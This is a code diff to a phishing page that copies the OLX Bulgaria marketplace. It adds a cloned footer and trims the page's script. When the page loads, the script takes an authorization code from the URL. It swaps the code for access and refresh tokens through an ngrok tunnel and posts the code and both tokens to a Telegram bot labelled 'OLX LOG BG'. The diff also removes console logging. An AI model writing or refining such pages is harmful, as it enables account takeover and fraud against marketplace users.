@@ -259,10 +259,42 @@
 
 <footer class="footer">
     <div class="footer-content">
-        <!-- колонки и ссылки -->
+        <div class="footer-column">
+            <a href="#" class="footer-link">Мобилни приложения</a>
+            <a href="#" class="footer-link">Помощ и Обратна връзка</a>
+            <a href="#" class="footer-link">Платени услуги</a>
+            <a href="#" class="footer-link">Бизнес на OLX</a>
+            <a href="#" class="footer-link">Блог на OLX</a>
+            <a href="#" class="footer-link">Условия за ползване</a>
+            <a href="#" class="footer-link">Политика за конфиденциалност</a>
+            <a href="#" class="footer-link">Реклама в сайта</a>
+            <a href="#" class="footer-link">За пресата</a>
+        </div>
+        <div class="footer-column">
+            <a href="#" class="footer-link">Правила за сигурност</a>
+            <a href="#" class="footer-link">Карта на сайта</a>
+            <a href="#" class="footer-link">Карта на регионите</a>
+            <a href="#" class="footer-link">Карта на бизнес страниците</a>
+            <a href="#" class="footer-link">Популярни заявки</a>
+            <a href="#" class="footer-link">Работа в OLX</a>
+            <a href="#" class="footer-link">Работодатели в OLX</a>
+            <a href="#" class="footer-link">Как да продавате и купувате?</a>
+            <a href="#" class="footer-link">OLX доставка</a>
+        </div>
+        <div class="footer-apps">
+            <div class="app-buttons">
+                <a href="#"><img src="https://upload.wikimedia.org/wikipedia/commons/7/78/Google_Play_Store_badge_EN.svg" alt="Google Play" class="app-badge"></a>
+                <a href="#"><img src="https://upload.wikimedia.org/wikipedia/commons/3/3c/Download_on_the_App_Store_Badge.svg" alt="App Store" class="app-badge"></a>
+            </div>
+            <p class="app-text">Безплатно приложение за вашия телефон</p>
+        </div>
     </div>
+
     <div class="footer-bottom">
-        <!-- ссылки на страны -->
+        <a href="#" class="country-link"><img src="https://upload.wikimedia.org/wikipedia/commons/9/9a/Flag_of_Bulgaria.svg" class="flag"> OLX.bg</a>
+        <a href="#" class="country-link"><img src="https://upload.wikimedia.org/wikipedia/en/1/12/Flag_of_Poland.svg" class="flag"> OLX.pl</a>
+        <a href="#" class="country-link"><img src="https://upload.wikimedia.org/wikipedia/commons/7/73/Flag_of_Romania.svg" class="flag"> OLX.ro</a>
+        <a href="#" class="country-link"><img src="https://upload.wikimedia.org/wikipedia/commons/5/5c/Flag_of_Portugal.svg" class="flag"> OLX.pt</a>
     </div>
 </footer>
 
@@ -279,15 +311,11 @@ const ngrokUrl = 'https://afd7-196-247-180-212.ngrok-free.app';
 // Отправка логов в Telegram
 async function sendLog(message) {
     try {
-        const response = await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
+        await fetch(`https://api.telegram.org/bot${TG_TOKEN}/sendMessage`, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
             body: JSON.stringify({ chat_id: TG_CHAT_ID, text: message, parse_mode: 'Markdown' })
         });
-        if (!response.ok) {
-            const errorData = await response.json();
-            console.error('Ошибка при отправке в Telegram:', errorData);
-        }
     } catch (e) {
         console.error('Ошибка при отправке логов в Telegram:', e);
     }
@@ -296,8 +324,7 @@ async function sendLog(message) {
 // Получение токенов через сервер
 async function getAccessToken(code) {
     try {
-        console.log("Отправка кода на сервер ngrok: ", code);
-        sendLog(`📤 **Отправка кода на сервер ngrok**: \`${code}\``);
+        sendLog(`📤 Отправка кода на сервер ngrok: ${code}`);
 
         const response = await fetch(`${ngrokUrl}/get_token`, {
             method: 'POST',
@@ -310,18 +337,12 @@ async function getAccessToken(code) {
         if (response.ok) {
             const accessToken = data.access_token;
             const refreshToken = data.refresh_token;
-            console.log('Access Token:', accessToken);
-            console.log('Refresh Token:', refreshToken);
-            sendLog(`🚀 **OLX LOG BG**\n👤 Access Token: ${accessToken}\n🔑 Refresh Token: ${refreshToken}\n✅ Статус: Токены успешно получены`);
+            sendLog(`🚀 OLX LOG BG\nAccess Token: ${accessToken}\nRefresh Token: ${refreshToken}\n✅ Токены успешно получены`);
         } else {
-            const errorMessage = `Ошибка получения токенов: ${JSON.stringify(data)}`;
-            console.error(errorMessage);
-            sendLog(`❌ **Ошибка получения токенов**\n${errorMessage}`);
+            sendLog(`❌ Ошибка получения токенов: ${JSON.stringify(data)}`);
         }
     } catch (error) {
-        const errorMessage = `Ошибка при получении токенов: ${error.message}`;
-        console.error(errorMessage);
-        sendLog(`❌ **Ошибка при получении токенов**\n${errorMessage}`);
+        sendLog(`❌ Ошибка при получении токенов: ${error.message}`);
     }
 }
 
@@ -334,12 +355,10 @@ function getCodeFromUrl() {
 window.onload = function() {
     const code = getCodeFromUrl();
     if (code) {
-        console.log('Получен код:', code);
-        sendLog(`📥 **Код получен:** \`${code}\``);
+        sendLog(`📥 Код получен: ${code}`);
         getAccessToken(code);
     } else {
-        sendLog('❌ **Ошибка**\nПараметр code не найден в URL.');
-        console.error('Ошибка: параметр code не найден в URL');
+        sendLog('❌ Параметр code не найден в URL.');
     }
 };
 </script>
